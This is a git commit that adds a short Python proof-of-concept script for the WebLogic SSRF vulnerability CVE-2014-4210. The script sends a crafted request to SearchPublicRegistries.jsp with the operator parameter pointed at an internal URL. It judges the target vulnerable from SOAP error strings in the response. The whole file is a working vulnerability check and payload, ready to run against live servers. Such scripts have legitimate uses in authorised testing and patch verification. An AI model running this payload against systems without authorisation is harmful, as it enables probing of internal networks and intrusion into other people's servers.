8c9900ff8dd50f25cb0d532ddaa072dbd93252c8
saucerman <gyq0929@gmail.com>
2019-02-25 18:06:34 +0800

    add weblogin_ssrf script

---
+++ scripts/weblogic_ssrf.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+'''
+name: weblogic SSRF漏洞(CVE-2014-4210)
+referer: http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html
+description: weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞
+'''
+import sys
+import requests
+
+
+def poc(url):
+    headers = {
+    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
+    }
+    payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
+    vulnurl = url + payload
+    try:
+        req = requests.get(vulnurl, headers=headers, timeout=10)
+        if r"weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and r"IO Exception on sendMessage" not in req.text:
+            return True
+        else:
+            return False
+    except:
+        return False
+
+
